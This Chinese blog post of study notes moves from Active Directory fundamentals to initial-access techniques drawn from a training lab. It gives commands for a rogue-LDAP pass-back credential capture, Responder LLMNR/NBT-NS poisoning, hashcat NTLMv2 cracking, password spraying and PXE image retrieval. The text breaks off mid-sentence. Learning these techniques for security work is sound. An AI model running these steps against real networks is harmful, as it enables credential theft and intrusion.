---
profileName: redcamellia
postId: "96"
postType: post
categories:
  - 2
---
# Active Directory basic
## 域
AD是Microsoft对于企业用户计算机集中管理的解决方案
对于大量的服务器以及计算机集，AD使用Windows域来定义他们，其中，运行AD服务的服务器被称为DC（Domain Controller）域控制器
域的优点是可以统筹管理所有用户的身份，以及轻松的管理Windows安全策略
## AD服务
AD支持许多对象，其中包括：
### 用户
用户是最常见的对象类型，其是安全主体的对象之一，意味着他们可以通过域进行身份验证以及分配对文件或打印机等资源的权限。
安全主体就是对网络中资源执行操作的对象
用户可用于表示两种类型的实体：
人员：用户通常代表需要访问网络的人员，比如员工。
服务：其还可以定义IIS或MSSQL等服务要使用的用户，每个服务都需要一个用户才能运行，他们与普通用户的区别是其只拥有对特定服务所需的权限。
### 机器
计算机也是AD中的一种对象，对于加入AD域的每一台计算机，将创建一个计算机对象，其也被视为是一种安全主体，并像普通用户一样被分配一个账户，这个账户在域中的权限有限。
但对于本地来说，计算机账户是本地管理员，其密码通常由120位随机字符组成，并会定期自动轮换
识别计算机账户比较容易，其通常带有$后缀
### 安全组
Windows可以定义用户组，以便将对文件或其他资源的访问权限分配给整个组，而不是单个用户。这样可以提高可管理性，我们可以将用户添加到现有组，并且他们将自动继承该组的所有权限。安全组也被视为安全主体，因此可以对网络上的资源具有权限。
组可以同时将用户和计算机作为成员。如果需要，组也可以包括其他组。
默认情况下，域会创建多个组，下面是重要的一些组：
域管理员：此组的用户对整个域具有管理权限。默认情况下，他们可以管理域上的任何计算机，包括 DC。
服务器操作员：此组中的用户可以管理域控制器。他们无法更改任何管理组成员身份。
备份操作员：允许此组中的用户访问任何文件，而忽略其权限。它们用于在计算机上执行数据备份。
账户运营商：此组中的用户可以在域中创建或修改其他帐户。
域用户：包括域中的所有现有用户帐户。
域计算机：包括域中的所有现有计算机。
域控制器：包括域上的所有现有 DC。
AD的用户与计算机：打开windows的AD管理软件，会看到域中的用户、计算机、组是有特定的层次结构的，这些对象按组织单位（OU）进行组织。组织单位是允许您对用户和计算机进行分类的容器对象。OU主要用于定义具有相似监管要求的用户集。例如，组织销售部门的人员可能应用了与 IT 人员不同的策略集。请记住，用户一次只能是单个 OU 的一部分。
除了OU之外，还有其他默认容器。这些容器由 Windows 自动创建，并包含以下内容：
内置：包含可用于任何 Windows 主机的默认组。
计算机：默认情况下，任何加入网络的机器都将被放在这里。如果需要，您可以移动它们。
域控制器：包含网络中 DC 的默认 OU。
用户：适用于域范围上下文的默认用户和组。
托管服务帐户：保存 Windows 域中服务使用的帐户。
## 在AD中管理用户与计算机
用户权限委派（Delegation）：
在 AD 中，可以让特定用户对某些 OU 进行一些控制。此过程称为委派，允许管理员授予普通用户在 OU 上执行高级任务的特定权限，而无需域管理员介入。
最常见的用例之一是授予重置其他低权限用户密码的权限。
对于计算机，通常被分为三个类别:
1. 工作站
工作站是 Active Directory 域中最常见的设备之一。域中的每个用户都可能登录到工作站。这是他们用来完成工作或正常浏览活动的设备。这些设备不应有特权用户登录到它们。
2. 服务器
服务器是 Active Directory 域中第二常见的设备。服务器通常用于向用户或其他服务器提供服务。
3. 域控制器
域控制器是 Active Directory 域中第三大最常见的设备。域控制器允许您管理 Active Directory 域。这些设备通常被认为是网络中最敏感的设备，因为它们包含环境中所有用户帐户的哈希密码
## 组策略
### GPO
上述所有的目的都是为了组织OU中的用户与计算机，背后的主题思想是为每个OU单独设定不同的策略
Windows通过组策略对象(GPO)管理此类策略
GPO是以 链接 的方式应用到OU的。链接到某OU的GPO将应用于它以及其所拥有的所有子OU。
GPO还可以应用 安全筛选 选项，以使他们仅应用于OU下的特定用户，计算机。默认情况下，将应用于经过身份验证的用户组。
### GPO的分发
GPO 通过存储在 DC 中的名为 的网络共享分发到网络。域中的所有用户通常都应有权通过网络访问此共享，以定期同步其 GPO。默认情况下，SYSVOL 共享指向我们网络中每个 DC 上的目录。SYSVOL :`C:\Windows\SYSVOL\sysvol\`

对任何 GPO 进行更改后，计算机可能需要长达 2 小时才能赶上进度。如果要强制任何特定计算机立即同步其 GPO，则始终可以在所需的计算机上运行以下命令：
`PS C:\> gpupdate /force`
## 域中的身份验证方法
使用 Windows 域时，所有凭据都存储在域控制器中。每当用户尝试使用域凭据对服务进行身份验证时，该服务都需要要求域控制器验证它们是否正确。两种协议可用于 Windows 域中的网络身份验证：
Kerberos：由任何最新版本的 Windows 使用。这是任何最新域中的默认协议。
NetNTLM：出于兼容性目的而保留的旧式身份验证协议。
虽然 NetNTLM 应被视为过时，但大多数网络都将启用这两种协议。
### Kerberos认证
Kerberos 身份验证是任何最新版本的 Windows 的默认身份验证协议。使用 Kerberos 登录服务的用户将获得票证。将票证视为先前身份验证的证明。拥有票证的用户可以将其提供给服务，以证明他们之前已经对网络进行了身份验证，因此可以使用它。

使用 Kerberos 进行身份验证时，将发生以下过程：

1.用户将其用户名和使用从其密码派生的密钥加密的时间戳发送到密钥分发中心 （KDC），该服务通常安装在负责在网络上创建 Kerberos 票证的域控制器上。
KDC 将创建并发回票证授予票证 （TGT），这将允许用户请求其他票证以访问特定服务。需要票证来获取更多票证可能听起来有点奇怪，但它允许用户在每次想要连接到服务时都无需传递其凭据即可请求服务票证。与 TGT 一起，向用户提供会话密钥，用户需要该密钥来生成以下请求。
请注意，TGT 是使用 krbtgt 帐户的密码哈希加密的，因此用户无法访问其内容。必须知道，加密的 TGT 包含会话密钥的副本作为其内容的一部分，并且 KDC 无需存储会话密钥，因为它可以在需要时通过解密 TGT 来恢复副本。
![Screenshot_2024-03-18-21-18-10-161-edit_com.microsoft.emmx.jpg](https://111.229.238.168/wordpress/wp-content/uploads/2024/12/Screenshot_2024-03-18-21-18-10-161-edit_com.microsoft.emmx_.jpg)
2.当用户想要连接到网络上的服务（如共享、网站或数据库）时，他们将使用其 TGT 向 KDC 请求票证授予服务 （TGS）。TGS 是仅允许连接到为其创建的特定服务的票证。若要请求 TGS，用户将发送其用户名和使用会话密钥加密的时间戳，以及 TGT 和服务主体名称 （SPN），该名称指示我们打算访问的服务和服务器名称。
因此，KDC 将向我们发送一个 TGS 和一个服务会话密钥，我们需要该密钥对我们想要访问的服务进行身份验证。TGS 使用从服务所有者哈希派生的密钥进行加密。服务所有者是运行服务的用户或计算机帐户。TGS 在其加密内容上包含服务会话密钥的副本，以便服务所有者可以通过解密 TGS 来访问它。
![Screenshot_2024-03-18-21-19-41-941-edit_com.microsoft.emmx.jpg](https://111.229.238.168/wordpress/wp-content/uploads/2024/12/Screenshot_2024-03-18-21-19-41-941-edit_com.microsoft.emmx_.jpg)
3.然后，可以将 TGS 发送到所需的服务以进行身份验证并建立连接。该服务将使用其配置的帐户的密码哈希来解密 TGS 并验证服务会话密钥。
![Screenshot_2024-03-18-21-20-18-980-edit_com.microsoft.emmx.jpg](https://111.229.238.168/wordpress/wp-content/uploads/2024/12/Screenshot_2024-03-18-21-20-18-980-edit_com.microsoft.emmx_.jpg)
### NetNTLM身份验证
NetNTLM 使用质询-响应机制工作。整个过程如下：
![Screenshot_2024-03-18-21-20-50-936-edit_com.microsoft.emmx.jpg](https://111.229.238.168/wordpress/wp-content/uploads/2024/12/Screenshot_2024-03-18-21-20-50-936-edit_com.microsoft.emmx_.jpg)
1.客户端向要访问的服务器发送身份验证请求。
2.服务器生成一个随机数，并将其作为质询发送给客户端。
3.客户端将其 NTLM 密码哈希与质询（和其他已知数据）相结合，以生成对质询的响应，并将其发送回服务器进行验证。
4.服务器将质询和响应转发给域控制器进行验证。
5.域控制器使用质询来重新计算响应，并将其与客户端发送的原始响应进行比较。如果两者都匹配，则客户端已通过身份验证;否则，访问将被拒绝。身份验证结果将发送回服务器。
6.服务器将认证结果转发给客户端。
请注意，为了安全起见，用户的密码（或哈希值）绝不会通过网络传输。

注意：所述过程适用于使用域帐户的情况。如果使用本地帐户，则服务器可以验证对质询本身的响应，而无需与域控制器交互，因为它的密码哈希存储在其本地 SAM 上。

## 树Tree,林Forest,信任Trust
随着公司的发展，他们的网络也在发展。为一家公司拥有一个域名就足够了，但随着时间的推移，一些额外的需求可能会促使其拥有多个域名。
### 树Tree
想象一下，您的公司突然扩展到一个新的国家。新国家/地区有不同的法律和法规，要求您更新 GPO 以符合要求。此外，您现在在两个国家/地区都有 IT 人员，每个 IT 团队都需要在不干扰另一个团队的情况下管理与每个国家/地区相对应的资源。虽然您可以创建复杂的 OU 结构并使用委派来实现此目的，但拥有庞大的 AD 结构可能难以管理并且容易出现人为错误。

幸运的是，Active Directory 支持集成多个域，以便将网络划分为可以独立管理的单元。如果有两个域共享相同的命名空间，则可以将这些域加入到树中。

如果我们的域被拆分为英国和美国分支的两个子域，您可以构建一个根域为 的树，以及两个名为 和 的子域，每个子域都有其 AD、计算机和用户：thm.local uk.thm.local us.thm.local
![Screenshot_2024-03-18-21-28-23-063-edit_com.microsoft.emmx.jpg](https://111.229.238.168/wordpress/wp-content/uploads/2024/12/Screenshot_2024-03-18-21-28-23-063-edit_com.microsoft.emmx_.jpg)
这种分区结构使我们能够更好地控制谁可以访问域中的内容。来自英国的 IT 人员将拥有自己的 DC，仅管理英国资源。例如，英国用户将无法管理美国用户。这样，每个分支的域管理员将完全控制其各自的 DC，但不能控制其他分支的 DC。

在谈论树木和森林时，需要引入一个新的安全组。Enterprise Admins 组将授予用户对企业所有域的管理权限。每个域仍将具有对其单个域具有管理员权限的域管理员，以及可以控制企业中所有内容的企业管理员。

### 林Forest
管理的域也可以在不同的命名空间中进行配置。假设公司继续发展并最终收购了另一家名为“当两家公司合并时”的公司，可能要为每家公司提供不同的域树，每家公司都由自己的 IT 部门管理。将具有不同命名空间的几棵树合并到同一个网络中称为林。
![Screenshot_2024-03-18-21-33-30-468-edit_com.microsoft.emmx.jpg](https://111.229.238.168/wordpress/wp-content/uploads/2024/12/Screenshot_2024-03-18-21-33-30-468-edit_com.microsoft.emmx_.jpg)

### 信任关系Trust
在树木和森林中组织多个域可以让您在管理和资源方面拥有一个很好的分区网络。但在某个时候，THM UK 的用户可能需要访问 MHT ASIA 服务器之一中的共享文件。为此，在树和林中排列的域通过信任关系连接在一起。
简单来说，在域之间建立信任关系允许您授权域中的用户访问域中的资源。
可以建立的最简单的信任关系是单向信任关系。在单向信任中，如果信任，这意味着 BBB 上的用户可以被授权访问 AAA 上的资源：
![Screenshot_2024-03-18-21-34-45-826-edit_com.microsoft.emmx.jpg](https://111.229.238.168/wordpress/wp-content/uploads/2024/12/Screenshot_2024-03-18-21-34-45-826-edit_com.microsoft.emmx_.jpg)
单向信任关系的方向与访问方向的方向相反。

还可以建立双向信任关系，以允许两个域相互授权来自另一个域的用户。默认情况下，在树或林下加入多个域将形成双向信任关系。

请务必注意，在域之间建立信任关系不会自动授予对其他域上所有资源的访问权限。建立信任关系后，您就有机会对不同域的用户进行授权，但实际授权与否取决于您。

# Breaching Active Directory
## 开始破坏AD
在利用 AD 错误配置进行权限提升、横向移动和目标执行之前，您需要先进行**初始访问**。您需要获取**一组初始**有效的 AD 凭据。由于 AD 服务和功能的数量，获取一组初始 AD 凭据的攻击面通常很大。
在查找第一组凭据时，我们不关注与帐户关联的权限;因此，即使是低特权帐户也足够了。我们只是在寻找一种向 AD 进行身份验证的方法，允许我们对 AD 本身进行进一步的枚举。
***获取初始凭证是接下来所有行动的目的。***
## OSINT和网络钓鱼
### OSINT
OSINT，即OpenSourceInTellgence(开源情报)用于发现已公开的相关目标信息。
而与AD凭据相关的：
- 在公共论坛（如 Stack Overflow）上提问但在问题中披露敏感信息（例如其凭据）的用户。
- 使用硬编码凭据将脚本上传到 Github 等服务的开发人员。
- 由于员工使用其工作帐户注册其他外部网站，因此在过去违规行为中披露了凭据。HaveIBeenPwned 和 DeHashed 等网站提供了极好的平台来确定某人的信息（例如工作电子邮件）是否曾经涉及公开的数据泄露。
通过使用 OSINT 技术，可以发现公开披露的凭据。如果我们有幸找到凭据，我们仍然需要找到一种方法来测试它们是否有效，因为 OSINT 信息可能已经过时。
### 网络钓鱼
网络钓鱼是破坏 AD 的另一种极好方法。 网络钓鱼通常诱使用户在恶意网页上提供其凭据，或要求他们运行将在后台安装远程访问木马 （RAT） 的特定应用程序。这是一种普遍的方法，因为 RAT 将在用户的上下文中执行，立即允许您模拟该用户的 AD 帐户。
## NTLM身份验证服务
### NTLM和NetNTLM
New Technology LAN Manager (NTLM)是一套安全协议，用于在 AD 中对用户的身份进行身份验证。网络上的服务大量使用此身份验证机制。但是，使用 NetNTLM 的服务也可以向 Internet 公开。以下是一些流行的例子：
- 公开 Outlook Web App （OWA） 登录门户的内部承载的 Exchange （邮件） 服务器。
- 向 Internet 公开的服务器的远程桌面协议 （RDP） 服务。
- 公开了与 AD 集成的 VPN 终结点。
- 面向 Internet 并使用 NetNTLM 的 Web 应用程序。
这意味着应用程序代表用户进行身份验证，而不是直接在应用程序本身上对用户进行身份验证。这样可以防止应用程序存储 AD 凭据，这些凭据应仅存储在域控制器上。此过程如下图所示：
![Pasted image 20240319212509.png](https://111.229.238.168/wordpress/wp-content/uploads/2024/12/Pasted-image-20240319212509.png)
### 暴力登录攻击
这些公开的服务为测试使用其他方式发现的凭据提供了绝佳的位置。但是，这些服务也可以直接用于尝试恢复一组初始有效的 AD 凭据。如果我们在最初的红队侦察期间恢复了有效的电子邮件地址等信息，我们也许可以尝试使用这些进行暴力攻击。
由于大多数 AD 环境都配置了帐户锁定，因此我们无法运行完整的暴力攻击。相反，我们需要执行密码喷射攻击。我们选择并使用一个密码（如某些服务初始部署后的初始密码未被用户更改），并尝试使用我们获得的所有用户名进行身份验证，而不是尝试多个可能触发帐户锁定机制的不同密码。但是，应该注意的是，由于这些类型的攻击将生成失败的身份验证尝试数量，因此可以检测到这些类型的攻击。我们可以使用 Hydra 等工具来协助密码喷射攻击。
## LADP绑定凭据
### LDAP协议
应用程序可以使用的另一种 AD 身份验证方法是轻量级目录访问协议 （LDAP） 身份验证。LDAP 身份验证类似于 NTLM 身份验证。但是，使用 LDAP 身份验证时，应用程序会直接验证用户的凭据。应用程序具有一对 AD 凭据，可以首先使用它们来查询 LDAP，然后验证 AD 用户的凭据。
LDAP 身份验证是与 AD 集成的第三方（非 Microsoft）应用程序的常用机制。这些包括应用程序和系统，例如：
- Gitlab
- Jenkins
- 定制开发的 Web 应用程序
- 打印机
- VPNs
如果这些应用程序或服务中的任何一个在 Internet 上公开，则可以使用与针对 NTLM 身份验证系统的攻击类型相同的攻击。但是，由于使用 LDAP 身份验证的服务需要一组 AD 凭据，因此它开辟了额外的攻击途径。从本质上讲，我们可以尝试恢复服务使用的 AD 凭据，以获得对 AD 的经过身份验证的访问。通过LDAP进行身份验证的过程如下所示：
![Pasted image 20240319212945.png](https://111.229.238.168/wordpress/wp-content/uploads/2024/12/Pasted-image-20240319212945.png)
如果您可以在正确的主机（例如 Gitlab 服务器）上站稳脚跟，则只需读取配置文件即可恢复这些 AD 凭据。这些凭据通常以纯文本形式存储在配置文件中，因为安全模型依赖于保持位置和存储配置文件的安全，而不是其内容。
### LDAP 回传攻击
但是，可以针对 LDAP 身份验证机制执行另一种非常有趣的攻击，称为 LDAP 回传攻击。当您获得对内部网络的初始访问权限时，这是一种针对网络设备（如打印机）的常见攻击，例如在会议室中插入恶意设备。
当我们访问指定了 LDAP 参数的设备配置时，可以执行 LDAP 回传攻击。例如，这可以是网络打印机的 Web 界面。通常，这些接口的凭据保留为默认凭据，例如 `admin:admin` 或 `admin:password` 。在这里，我们将无法直接提取LDAP凭据，因为密码通常是隐藏的。但是，我们可以更改LDAP配置，例如LDAP服务器的IP或主机名。在LDAP回传攻击中，我们可以将此IP修改为我们的IP，然后测试LDAP配置，这将强制设备尝试对我们的恶意设备进行LDAP身份验证。我们可以拦截此身份验证尝试以恢复 LDAP 凭据。
### 执行 LDAP 回传
在将设备的LDAP服务器IP改为我们的攻击机后，我们就可以进行LDAP回传攻击了。
从本质上讲，在打印机发送凭据之前，它正在尝试协商 LDAP 身份验证方法详细信息。它将使用此协商来选择打印机和 LDAP 服务器都支持的最安全的身份验证方法。如果身份验证方法过于安全，则不会以明文形式传输凭据。使用某些身份验证方法，凭据根本不会通过网络传输！因此，我们不能只使用普通的 Netcat 来获取凭据。我们需要创建一个流氓 LDAP 服务器并对其进行不安全的配置，以确保凭据以明文形式发送。
#### 托管恶意LDAP服务器
有几种方法可以托管恶意 LDAP 服务器，我们将使用 OpenLDAP。
使用以下命令安装 OpenLDAP：
```bash
sudo apt-get update && sudo apt-get -y install slapd ldap-utils && sudo systemctl enable slapd
```
在初始配置时，对于 DNS 域名，提供我们的目标域名,确保对组织名称也使用相同的名称，设置密码，选择MDB作为LDAP数据库
在使用流氓LDAP服务器之前，我们需要通过降级支持的身份验证机制来使其容易受到攻击。我们希望确保我们的 LDAP 服务器仅支持 PLAIN 和 LOGIN 身份验证方法。为此，我们需要创建一个新的 ldif 文件，该文件使用以下内容调用：
```
#olcSaslSecProps.ldif dn: cn=config replace: olcSaslSecProps olcSaslSecProps: noanonymous,minssf=0,passcred
```
该文件具有以下属性：
- olcSaslSecProps：指定 SASL 安全属性
- noanonymous：禁用支持匿名登录的机制
- minssf：指定可接受的最小安全强度，为 0，表示无保护。
```bash
sudo ldapmodify -Y EXTERNAL -H ldapi:// -f ./olcSaslSecProps.ldif && sudo service slapd restart
```
我们可以使用以下命令验证我们的流氓LDAP服务器的配置是否已应用（注意：如果使用的是Kali，则可能不会收到任何输出，但是该配置应该已经工作，可以继续执行后续步骤）：
```bash
Camllia@kali$ ldapsearch -H ldap:// -x -LLL -s base -b "" supportedSASLMechanisms 
dn: supportedSASLMechanisms: PLAIN supportedSASLMechanisms: LOGIN
```
#### 捕获LDAP凭证
我们的流氓 LDAP 服务器现已配置完毕。当设备向我们发送LDAP请求时，身份验证将以明文形式进行。如果正确配置了恶意 LDAP 服务器，并且它正在降级通信，您将收到以下错误：“This distinguished name contains invalid syntax”。如果收到此错误，可以使用 tcpdump 通过以下命令捕获凭据：
```bash
[Redcamellia@kali]$ sudo tcpdump -SX -i {attacker IP} tcp port 389
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode listening on eth1, link-type EN10MB (Ethernet), snapshot length 262144 bytes 10:41:52.979933 IP 10.10.10.201.49834 > 10.10.10.57.ldap: Flags [P.], seq 4245946075:4245946151, ack 1113052386, win 8212, length 76 0x0000: 4500 0074 b08c 4000 8006 20e2 0a0a 0ac9 E..t..@......... 0x0010: 0a0a 0a39 c2aa 0185 fd13 fedb 4257 d4e2 ...9........BW.. 0x0020: 5018 2014 1382 0000 3084 0000 0046 0201 P.......0....F.. 0x0030: 0263 8400 0000 3d04 000a 0100 0a01 0002 .c....=......... 0x0040: 0100 0201 7801 0100 870b 6f62 6a65 6374 ....x.....object 0x0050: 636c 6173 7330 8400 0000 1904 1773 7570 class0.......sup 0x0060: 706f 7274 6564 5341 534c 4d65 6368 616e portedSASLMechan 0x0070: 6973 6d73 isms 10:41:52.979938 IP 10.10.10.57.ldap > 10.10.10.201.49834: Flags [.], ack 4245946151, win 502, length 0 0x0000: 4500 0028 247d 4000 4006 ed3d 0a0a 0a39 E..($}@.@..=...9 0x0010: 0a0a 0ac9 0185 c2aa 4257 d4e2 fd13 ff27 ........BW.....' 0x0020: 5010 01f6 2930 0000 P...)0.. 10:41:52.980162 IP 10.10.10.57.ldap > 10.10.10.201.49834: Flags [P.], seq 1113052386:1113052440, ack 4245946151, win 502, length 54 0x0000: 4500 005e 247e 4000 4006 ed06 0a0a 0a39 E..^$~@.@......9 0x0010: 0a0a 0ac9 0185 c2aa 4257 d4e2 fd13 ff27 ........BW.....' 0x0020: 5018 01f6 2966 0000 3034 0201 0264 2f04 P...)f..04...d/. 0x0030: 0030 2b30 2904 1773 7570 706f 7274 6564 .0+0)..supported 0x0040: 5341 534c 4d65 6368 616e 6973 6d73 310e SASLMechanisms1. 0x0050: 0405 504c 4149 4e04 054c 4f47 494e ..PLAIN..LOGIN [....] 10:41:52.987145 IP 10.10.10.201.49835 > 10.10.10.57.ldap: Flags [.], ack 3088612909, win 8212, length 0 0x0000: 4500 0028 b092 4000 8006 2128 0a0a 0ac9 E..(..@...!(.... 0x0010: 0a0a 0a39 c2ab 0185 8b05 d64a b818 7e2d ...9.......J..~- 0x0020: 5010 2014 0ae4 0000 0000 0000 0000 P............. 10:41:52.989165 IP 10.10.10.201.49835 > 10.10.10.57.ldap: Flags [P.], seq 2332415562:2332415627, ack 3088612909, win 8212, length 65 0x0000: 4500 0069 b093 4000 8006 20e6 0a0a 0ac9 E..i..@......... 0x0010: 0a0a 0a39 c2ab 0185 8b05 d64a b818 7e2d ...9.......J..~- 0x0020: 5018 2014 3afe 0000 3084 0000 003b 0201 P...:...0....;.. 0x0030: 0560 8400 0000 3202 0102 0418 7a61 2e74 .`....2.....za.t 0x0040: 7279 6861 636b 6d65 2e63 6f6d 5c73 7663 ryhackme.com\svc 0x0050: 4c44 4150 8013 7472 7968 6163 6b6d 656c LDAP..password11
```
请注意， `password11` 是一个示例。服务的密码将有所不同。
通过使用 LDAP 回传攻击并降级支持的身份验证机制，我们可以以明文形式拦截凭据。
## 身份验证中继
我们现在将研究针对更广泛的网络身份验证协议的攻击。在 Windows 网络中，有大量服务相互通信，允许用户使用网络提供的服务。
这些服务必须使用内置身份验证方法来验证传入连接的身份。在[[Active Directory#NTLM身份验证服务]]中，我们探讨了 Web 应用程序上使用的 NTLM 身份验证。在此节点中，我们将更深入地研究从网络的角度来看此身份验证的外观。但是，对于此节点，我们将重点介绍 SMB 使用的 NetNTLM 身份验证。
### Service Message Block(SMB)
服务器消息块 （SMB） 协议允许客户端（如工作站）与服务器（如文件共享）进行通信。在使用 Microsoft AD 的网络中，SMB 管理从网络间文件共享到远程管理的所有内容。甚至在尝试打印文档时，计算机收到的“缺纸”警报也是 SMB 协议的工作。
但是，早期版本的 SMB 协议的安全性被认为不足。发现了多个漏洞和漏洞，可用于恢复凭据，甚至在设备上执行代码。尽管其中一些漏洞在协议的较新版本中得到了解决，但由于旧系统不支持它们，组织通常不会强制使用更新的版本。我们将研究使用 SMB 进行 NetNTLM 身份验证的两种不同漏洞：
- 由于 NTLM 挑战可以被拦截，因此我们可以使用离线破解技术来恢复与 NTLM 挑战相关的密码。但是，此破解过程比直接破解 NTLM 哈希要慢得多。
- 我们可以使用我们的流氓设备来发动中间人攻击，在客户端和服务器之间中继 SMB 身份验证，这将为我们提供活动的身份验证会话和对目标服务器的访问。
### LLMNR、NBT-NS 和 WPAD与Responder
我们将稍微了解一下在使用 SMB 期间发生的身份验证。我们将使用 Responder 尝试拦截 NetNTLM 质询以破解它。网络上通常有很多这样的挑战。一些安全解决方案甚至执行整个 IP 范围的扫描，以从主机恢复信息。
Responder 允许我们通过在 NetNTLM 身份验证期间毒害响应来执行中间人攻击，诱骗客户端与您交谈，而不是他们想要连接到的实际服务器。在实际 LAN 上，响应程序将尝试毒害检测到的任何链路本地多播名称解析 （LLMNR）、NetBIOS 名称服务 （NBT-NS） 和 Web 代理自动发现 （WPAD） 请求。在大型 Windows 网络上，这些协议允许主机对同一本地网络上的所有主机执行自己的本地 DNS 解析。主机可以首先尝试通过发送 LLMNR 请求并查看是否有任何主机响应来确定他们正在寻找的主机是否位于同一本地网络上，而不是使网络资源（如 DNS 服务器）负担过重。NBT-NS 是 LLMNR 的前身协议，WPAD 请求是为了尝试为将来的 HTTP（s） 连接找到代理。
由于这些协议依赖于在本地网络上广播的请求，因此我们的恶意设备也会接收这些请求。通常，这些请求会被简单地删除，因为它们不是为我们的主机准备的。但是，响应程序将主动侦听请求并发送中毒响应，告诉请求主机我们的 IP 与请求的主机名相关联。通过毒害这些请求，Responder 试图强制客户端连接到我们的 AttackBox。在同一行中，它开始托管多个服务器，例如 SMB、HTTP、SQL 等，以捕获这些请求并强制进行身份验证。
### 拦截 NetNTLM 质询
需要注意的一点是，Responder 实质上试图通过毒害连接来赢得竞争条件，以确保拦截连接。这意味着响应程序通常仅限于在本地网络上中毒身份验证质询。
尽管当从连接到组织局域网的流氓设备执行时，Responder 将能够拦截和毒害更多身份验证请求，但了解这种行为可能会造成破坏并因此被检测到这一点至关重要。通过毒害身份验证请求，正常的网络身份验证尝试将失败，这意味着用户和服务将无法连接到他们打算连接到的主机和共享。在安全评估中使用 Responder 时，请记住这一点。
我们将 Responder 设置在想要拦截的网络接口上运行：
```bash
sudo responder -I {IP/interface}
```
响应程序现在将侦听传入的任何 LLMNR、NBT-NS 或 WPAD 请求。
我们可能会运行 Responder 相当长一段时间，捕获多个响应。一旦我们有了一对hash，我们就可以开始对响应进行一些离线破解，以期恢复其关联的NTLM密码。如果帐户配置了弱密码，我们很有可能成功破解它们。
假设我们拦截了一个SMBv2连接，Responder 可以使用该连接来诱使和提取 NTLMv2-SSP 响应。它看起来像这样：
```bash
[+] Listening for events...
[SMBv2] NTLMv2-SSP Client : <Client IP>
[SMBv2] NTLMv2-SSP Username : ZA\<Service Account Username> 
[SMBv2] NTLMv2-SSP Hash : <Service Account Username>::ZA:<NTLMv2-SSP Hash>
```
尝试使用以下命令破解哈希值：
`hashcat -m 5600 <hash file> <password file> --force`
我们使用 hashtype 5600，它与 hashcat 的 NTLMv2-SSP 相对应。
我们可以破解的任何哈希现在都将为我们的违规行为提供 AD 凭据！
### 传递质询（challenge）
然而，在某些情况下，我们可以更进一步，尝试传递挑战，而不仅仅是直接捕捉它。在没有事先了解帐户的情况下，这有点困难，因为这种攻击取决于关联帐户的权限。我们需要做几件事来发挥对我们有利的作用：
- 应禁用或启用 SMB 签名，但不强制执行。当我们执行中继时，我们会对传递它的请求进行细微的更改。如果启用了强制SMB 签名，我们将无法伪造消息签名，这意味着服务器将拒绝它。
- 关联的账号需要服务器相关权限才能访问请求的资源。理想情况下，我们希望中继对服务器具有管理权限的帐户的质询和响应，因为这将使我们能够在主机上站稳脚跟。
- 由于从技术上讲，我们还没有 AD 立足点，因此需要对哪些帐户对哪些主机拥有权限进行一些猜测。如果我们已经破坏了 AD，我们可以先执行一些初始枚举，通常是这种情况。
这就是为什么盲目中继通常不受欢迎的原因。理想情况下，您应首先使用其他方法破坏 AD，然后执行枚举以确定与已入侵的帐户关联的权限。从这里，您通常可以执行横向移动以跨域进行权限提升。但是，从根本上讲，中继攻击的工作原理仍然很好，如下图所示：
![Pasted image 20240319221208.png](https://111.229.238.168/wordpress/wp-content/uploads/2024/12/Pasted-image-20240319221208.png)
## Microsoft 部署工具包（Microsoft Deployment Toolkit）
大型组织需要工具来部署和管理房地产的基础设施。在大型组织中，您不能让 IT 人员使用 DVD 甚至 USB 闪存驱动器在每台机器上安装软件。幸运的是，Microsoft已经提供了管理资产所需的工具。但是，我们可以利用这些工具中的错误配置来破坏 AD。
### MDT and SCCM MDT 和 SCCM
Microsoft 部署工具包 （MDT） 是一项 Microsoft 服务，可帮助自动部署 Microsoft 操作系统 （OS）。大型组织使用 MDT 等服务来帮助更有效地在其资产中部署新映像，因为可以在中心位置维护和更新基础映像。
通常，MDT 与 Microsoft 的系统中心配置管理器 （SCCM） 集成，后者管理所有 Microsoft 应用程序、服务和操作系统的所有更新。MDT 用于新部署。从本质上讲，它允许 IT 团队预配置和管理启动映像。因此，如果他们需要配置一台新机器，他们只需要插入一根网线，一切都会自动发生。他们可以对启动映像进行各种更改，例如已经安装了默认软件（如 Office365）和组织选择的防病毒软件。它还可以确保在安装运行时更新新版本。
SCCM 几乎可以看作是 MDT 的扩展和老大哥。软件安装后会发生什么情况？好吧，SCCM 会进行这种类型的补丁管理。它允许 IT 团队查看整个资产中安装的所有软件的可用更新。团队还可以在沙盒环境中测试这些补丁，以确保它们稳定，然后再将它们集中部署到所有已加入域的计算机。它使 IT 团队的工作变得更加轻松。
但是，任何提供基础结构集中管理（如 MDT 和 SCCM）的东西也可能成为攻击者的目标，试图接管资产中的大部分关键功能。尽管可以通过多种方式配置 MDT，但对于此任务，我们将专门介绍称为预启动执行环境 （PXE） 启动的配置。
### PXE Boot
大型组织使用 PXE 启动来允许连接到网络的新设备直接通过网络连接加载和安装操作系统。MDT 可用于创建、管理和托管 PXE 启动映像。PXE 启动通常与 DHCP 集成，这意味着如果 DHCP 分配了 IP 租约，则允许主机请求 PXE 启动映像并启动网络操作系统安装过程。通信流程如下图所示：
![Pasted image 20240319221813.png](https://111.229.238.168/wordpress/wp-content/uploads/2024/12/Pasted-image-20240319221813.png)
执行该过程后，客户端将使用 TFTP 连接下载 PXE 启动映像。我们可以将 PXE 启动映像用于两个不同的目的：
- 注入权限提升向量（如本地管理员帐户），以便在 PXE 启动完成后获得对操作系统的管理访问权限。
- 执行密码抓取攻击以恢复安装期间使用的 AD 凭据。
我们在此将重点关注后者。我们将尝试在安装期间恢复与 MDT 服务关联的部署服务帐户，以进行此密码抓取攻击。此外，还可以检索用于无人值守安装应用程序和服务的其他 AD 帐户。
### PXE 启动镜像检索
由于DHCP有点难，我们将绕过此攻击的初始步骤。我们将跳过尝试从 DHCP 请求 IP 和 PXE 启动预配置详细信息的部分。我们将在此过程中手动执行此步骤中的其余攻击。
有关通过 DHCP 接收的 PXE 启动预配置的第一条信息是 MDT 服务器的 IP。
您将收到的第二条信息是 BCD 文件的名称。这些文件存储与不同类型体系结构的 PXE 启动相关的信息。
如下：
![Pasted image 20240319222004.png](https://111.229.238.168/wordpress/wp-content/uploads/2024/12/Pasted-image-20240319222004.png)
通常，您将使用 TFTP 请求每个 BCD 文件，并枚举所有这些文件的配置。 MDT 每天都会重新生成文件及其名称。
现在，通过从 DHCP（已跳过）恢复此初始信息，我们可以枚举和检索 PXE 启动映像。
连接到在域中的初始立足点：
